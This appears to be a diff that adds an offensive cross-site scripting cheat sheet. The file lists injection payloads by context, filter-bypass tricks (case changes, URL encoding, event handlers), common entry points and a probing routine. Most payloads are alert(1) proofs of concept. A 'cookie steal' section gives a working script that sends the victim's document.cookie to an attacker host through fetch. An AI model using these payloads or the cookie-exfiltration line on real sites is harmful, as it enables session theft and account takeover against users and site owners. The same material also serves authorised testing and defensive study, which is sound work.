@@ -1,0 +1,164 @@
+========================================
+XSS (CROSS-SITE SCRIPTING) CHEATSHEET
+========================================
+
+[HOW TO IDENTIFY XSS]
+- Your input appears in page response
+- Reflected in HTML / JS / attribute
+- Try typing: test → see if it shows
+
+========================================
+🔥 BASIC TEST PAYLOADS
+========================================
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(1)</script>
+
+========================================
+⚡ REFLECTED XSS
+========================================
+
+- Input comes from URL / form
+- Reflected immediately
+
+Payloads:
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+
+========================================
+💾 STORED XSS
+========================================
+
+- Saved in database (comments, profile)
+
+Payloads:
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+
+========================================
+🧠 DOM-BASED XSS
+========================================
+
+- Happens via JavaScript
+- Look for:
+  document.write
+  innerHTML
+  location
+
+Payloads:
+#<script>alert(1)</script>
+?name=<script>alert(1)</script>
+
+========================================
+🔓 ATTRIBUTE INJECTION
+========================================
+
+<input value="USER_INPUT">
+
+Payloads:
+" onfocus=alert(1) autofocus
+" onclick=alert(1)
+" onmouseover=alert(1)
+
+========================================
+🧩 TAG BREAKING
+========================================
+
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+
+========================================
+🚫 FILTER BYPASS
+========================================
+
+[Case bypass]
+<ScRiPt>alert(1)</ScRiPt>
+
+[No script tag]
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+[Encoding]
+<script>alert(1)</script>
+→ %3Cscript%3Ealert(1)%3C/script%3E
+
+[Event handlers]
+onerror=alert(1)
+onload=alert(1)
+
+========================================
+🧪 CONTEXT-BASED PAYLOADS
+========================================
+
+[Inside HTML]
+<script>alert(1)</script>
+
+[Inside attribute]
+" onfocus=alert(1) autofocus
+
+[Inside JS]
+';alert(1);//
+
+[Inside URL]
+javascript:alert(1)
+
+========================================
+🔗 COMMON ENTRY POINTS
+========================================
+
+- Search box
+- Login/register forms
+- Comment sections
+- URL parameters (?q=)
+- Profile fields
+
+========================================
+📡 COOKIE STEAL (ADVANCED)
+========================================
+
+<script>fetch('http://attacker.com?c='+document.cookie)</script>
+
+========================================
+🧠 TEST FLOW (IMPORTANT)
+========================================
+
+1. Enter: test
+2. Check reflection
+3. Try basic payload
+4. Try breaking context (", ')
+5. Try alternative payloads (img, svg)
+6. Try encoding
+
+========================================
+🔥 QUICK PAYLOAD SET
+========================================
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(1)</script>
+" onfocus=alert(1) autofocus
+javascript:alert(1)
+';alert(1);//
+
+========================================
+⚠️ COMMON MISTAKES
+========================================
+
+- Not checking where input appears
+- Using wrong payload for context
+- Ignoring DevTools (Console errors)
+
+========================================
+RULES
+========================================
+
+- REFLECTION = OPPORTUNITY
+- CONTEXT IS EVERYTHING
+- TRY MULTIPLE PAYLOADS
+- SIMPLE > COMPLEX
+
+========================================
